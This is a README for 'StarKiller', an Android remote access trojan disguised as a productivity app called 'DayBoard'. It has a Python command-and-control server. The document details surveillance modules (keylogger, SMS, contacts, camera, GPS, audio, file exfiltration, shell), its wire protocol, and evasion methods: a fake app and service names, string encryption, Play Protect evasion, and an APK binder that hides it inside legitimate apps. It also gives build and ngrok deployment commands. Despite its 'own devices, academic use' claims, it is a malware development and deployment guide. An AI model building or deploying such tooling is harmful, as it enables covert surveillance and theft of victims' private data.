# STARKILLER

```
 ███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ███████╗   ██║   ███████║██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ╚════██║   ██║   ██╔══██║██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ███████║   ██║   ██║  ██║██║  ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
```

**22DIV // george wu // Android Remote Access**

> *"The dark side is a pathway to many abilities some consider to be... unnatural."*

---

### Classification

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
AUTHORISATION:   CSEC academic research, own devices
DOCTRINE:        Israeli cyber methodology — cross-platform capability
                 Windows + Android. Desktop + mobile. Full-spectrum.
TARGET:          Own Android devices ONLY
STATUS:          PHASE 4 COMPLETE — full automated test suite, 13/13 PASS
COMMIT:          0a84f8c (2026-06-25)
VALIDATED ON:    Samsung Galaxy S10e (SM-G970U) — Android 12, One UI 4
```

### What This Is

Android RAT built from first principles. Kotlin client disguised as a productivity app ("DayBoard"),
Python C2 server with desktop GUI and Discord relay. Speaks VADER agent protocol — 4-byte big-endian
length-prefixed JSON over raw TCP port 8667. Includes obfuscation pipeline, APK binder, detection
scanner, and fully automated test suite that runs from a locked phone with no manual interaction.

Own hardware only. CSEC security research. Private repo.

---

### Architecture

```
StarKiller/
├── server/
│   ├── starkiller_c2.py          C2 server — web dashboard + agent listener
│   ├── starkiller_gui.py         Desktop GUI C2 — tkinter, Discord relay, live VNC panel
│   └── test_client.py            Simulated Android agent for offline testing
├── client/                       Android Kotlin project (com.georgetech.filesync)
│   └── app/src/main/
│       ├── kotlin/com/georgetech/filesync/
│       │   ├── Config.kt               C2 host/port — build-time injected by build.py
│       │   ├── Crypt.kt                XOR string obfuscation — k() decodes at runtime
│       │   ├── MainActivity.kt         Launcher — starts SyncService
│       │   ├── CoverActivity.kt        Cover UI "DayBoard" — permissions + first-run
│       │   ├── SyncService.kt          Foreground service — owns TCP + MediaProjection
│       │   ├── SyncAdapter.kt          VADER protocol framing (4-byte length prefix)
│       │   ├── Dispatcher.kt           Task router — XOR-encoded op codes
│       │   ├── GrantActivity.kt        MediaProjection consent — sends ACTION_ACTIVATE_MP
│       │   ├── AccessService.kt        AccessibilityService — screenshot backend
│       │   └── modules/
│       │       ├── DisplayHelper.kt    VNC stream + screenshot (MediaProjection)
│       │       ├── PhotoHelper.kt      Camera2 API — front/back JPEG
│       │       ├── LocProvider.kt      GPS + network location
│       │       ├── AudioHelper.kt      Ambient audio (MediaRecorder)
│       │       ├── MsgReader.kt        SMS read + send
│       │       ├── AddrBook.kt         Contacts dump
│       │       ├── StorageHelper.kt    Directory list + file exfil
│       │       ├── HistoryReader.kt    Browser history (Chrome ContentProvider)
│       │       ├── PkgScanner.kt       Installed package list
│       │       ├── SysInfo.kt          Device fingerprint
│       │       ├── InputService.kt     Accessibility keylogger
│       │       └── AlertService.kt     Notification interception
│       ├── res/xml/accessibility_service_config.xml
│       └── AndroidManifest.xml
├── payloads/               Built APKs — gitignored, see Releases
├── assets/                 Screenshots, scan reports
├── docs/
│   └── index.html          Technical overview (dark-themed HTML)
├── build.py                Inject C2 config → Gradle build → copy APK
├── setup.py                One-time: download Android SDK + Gradle
├── obfuscate.py            String encryption + ProGuard + DEX scanner
├── binder.py               APK injection into legitimate host APK
├── test_auto.py            Full automated test suite (device required)
└── server/test_client.py   Headless simulated-agent tests (no device)
```

---

### VADER Protocol

```
Wire format: [4-byte big-endian length][UTF-8 JSON body]

Agent → C2 (on connect):
  { "type": "register", "hostname": "SM-G970U", "model": "samsung SM-G970U", "battery": 100 }

Agent → C2 (heartbeat, every 30s):
  { "type": "heartbeat", "battery": 98, "timestamp": 1750000000000 }

C2 → Agent (task):
  { "type": "task", "task_id": "a3f9b1", "op": "vnc", "frames": 5, "interval": 500 }

Agent → C2 (VNC frame, N intermediate results):
  { "type": "result", "task_id": "a3f9b1", "data": { "frame": 0, "total": 5, "source": "mediaprojection", "data": "<base64>", "bytes": 12345 } }

Agent → C2 (VNC stream_done):
  { "type": "result", "task_id": "a3f9b1", "data": { "status": "stream_done", "frames_sent": 5, "frames_requested": 5 } }
```

---

### Capability Matrix

| Op | Module | Status | Notes |
|----|--------|--------|-------|
| `vnc` | DisplayHelper | **LIVE 5/5** | MediaProjection. lastFrame cache for Samsung VD lazy-push. acc→MP fallback. |
| `screenshot` | DisplayHelper | **LIVE (MP)** | Samsung strips acc capability — falls back to MediaProjection + lastFrame. |
| `camera` | PhotoHelper | **LIVE** | front/back Camera2. JPEG 60%. Runtime perm via ADB. |
| `gps` | LocProvider | **LIVE** | lastKnown fast path, then requestSingleUpdate on main Looper. 15s timeout. |
| `sysinfo` | SysInfo | **LIVE** | model, OS, IMEI, WiFi SSID, IP, battery. |
| `record` | AudioHelper | IMPL | MediaRecorder to 3GP. duration param. |
| `messages` | MsgReader | IMPL | ContentResolver SMS dump + send. |
| `contacts` | AddrBook | IMPL | Full contact export: name, phone, email. |
| `ls` / `file_download` | StorageHelper | IMPL | Directory list + raw file exfil. |
| `sh` | Dispatcher | IMPL | Runtime.exec() → stdout/stderr/exit. |
| `apps` | PkgScanner | IMPL | PackageManager dump with version + signature. |
| `history` | HistoryReader | IMPL | Chrome history ContentProvider. |
| `acc_status` | Dispatcher | **LIVE** | AccessibilityService bind status + capability probe. |
| `screen_grant` | Dispatcher | **LIVE** | Launch GrantActivity → MediaProjection consent dialog. |
| `ping` | Dispatcher | **LIVE** | Latency check. |

---

### Automated Test Results — commit 0a84f8c

**Samsung Galaxy S10e (SM-G970U), Android 12, One UI 4. Fully automated from locked-phone state.**

```
[PASS] ADB device connected
[PASS] APK installed (com.georgetech.filesync)
[PASS] Runtime permissions granted via ADB pm grant
[PASS] AccessibilityService enabled (UI automation: Installed apps → Screen Assist → Allow)
[PASS] ADB reverse tunnel 8667 active
[PASS] C2 mini-server listening
[PASS] Agent registered (SM-G970U, android 12)
[PASS] acc_status: bound=False (service not yet confirmed)
[PASS] AccessibilityService BOUND (uiautomator UI confirm)
[~PASS] Screenshot: ADB fallback (MediaProjection grant pending — expected)
[PASS] Camera front: 14KB JPEG received
[PASS] VNC stream: 5/5 frames (MediaProjection)
[PASS] GPS: lat=-33.906, lon=151.022 (network provider)

RESULT: 13/13 PASS  0 FAIL
```

---

### Samsung One UI 4 — Platform Quirks

| Issue | Root Cause | Applied Fix |
|-------|------------|-------------|
| ADB a11y settings grant silently ignored | SemExclusiveTaskManagerService blocks third-party services | uiautomator: Accessibility → Installed apps → Screen Assist → Allow |
| `takeScreenshot()` throws RuntimeException | Samsung strips CAPABILITY_CAN_TAKE_SCREENSHOT from third-party services | try-catch in captureFrame() → returns null → falls to MediaProjection |
| VirtualDisplay only pushes frames on screen change | VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR lazy-push behavior | lastFrame cache: `frameQ.poll(2s) ?: lastFrame` |
| `projection = null` after setupCapture() | teardown() nulled projection; setupCapture() never re-set it | Added `projection = proj` after `virtDisplay = vd` assignment |
| MediaProjection dies when GrantActivity.finish() | Projection lifecycle bound to Activity context | ACTION_ACTIVATE_MP intent → getMediaProjection() runs inside SyncService foreground executor |
| GPS crash on thread pool | requestSingleUpdate(null Looper) on non-looper thread | `Looper.getMainLooper()` passed explicitly |
| uiautomator XML parse failure | Samsung appends trailing text after `</hierarchy>` | Truncate at `raw.rfind("</hierarchy>")` before ET.fromstring() |

---

### Evasion / Obfuscation

| Layer | Technique |
|-------|-----------|
| App name | "DayBoard" — productivity cover |
| Service label | "Screen Assist" — blends with system services |
| Package name | `com.georgetech.filesync` — looks like a sync library |
| String encryption | XOR+Base64 all op codes, keys, protocol strings in Dispatcher.kt |
| ProGuard R8 | 5-pass, flatten packages, repackage, strip source info, aggressive shrink |
| Build-time injection | C2 host/port never in source control — written to Config.kt by build.py |
| Play Protect | CLEAN on test build (stripped manifest, no dangerous perms declared) |
| APK binder | Inject Smali into legitimate host APK via binder.py |

---

### Quick Start

```bash
# 1. One-time setup (downloads Android SDK + Gradle)
python setup.py

# 2. Build APK with your C2 IP
python build.py --ip 192.168.1.x --port 8667 --name DayBoard

# 3. Start GUI C2
python server/starkiller_gui.py

# 4. Headless test (no device needed)
python server/test_client.py --ip 127.0.0.1

# 5. Full automated device test
python test_auto.py

# 6. WAN deploy via ngrok
ngrok tcp 8667
python build.py --ip 0.tcp.au.ngrok.io --port <NGROK_PORT> --name DayBoard

# 7. Bind into legitimate APK
python binder.py target.apk

# 8. Scan for detection signatures
python obfuscate.py scan payloads/starkiller-debug.apk
```

---

### GUI Test with Live Screen (scrcpy)

**Requires:** ADB device connected, scrcpy installed (`winget install Genymobile.scrcpy`)

```bash
# Terminal 1 — mirror phone screen
scrcpy --window-title "StarKiller-Target" --no-audio --stay-awake

# Terminal 2 — start C2
python server/starkiller_gui.py

# Terminal 3 — run automated test
python test_auto.py
```

Watch the scrcpy window. The test will:
1. Wake + unlock the phone
2. Open Accessibility Settings, navigate to Screen Assist, toggle on
3. Confirm the grant dialog
4. Run screenshot, camera, VNC, GPS sequentially

---

### Build Requirements

| Tool | Version | Install |
|------|---------|---------|
| Java JDK | 17+ | `winget install Microsoft.OpenJDK.17` |
| Python | 3.10+ | System |
| Android SDK | cmdline-tools | `python setup.py` (auto-downloads) |
| ADB | Any | Bundled with Android SDK |
| scrcpy | Latest | `winget install Genymobile.scrcpy` |
| Pillow | Latest | `pip install Pillow` |

---

### Rules of Engagement

1. Own devices only
2. Private repo — never public
3. CSEC academic research context
4. No distribution of built APKs
5. Binaries never committed to repo — see GitHub Releases for APK
6. All protocol strings encrypted in DEX
7. No plaintext C2 config in source control

---

*Built from VADER's protocol. The agent doesn't care what OS it runs on.*
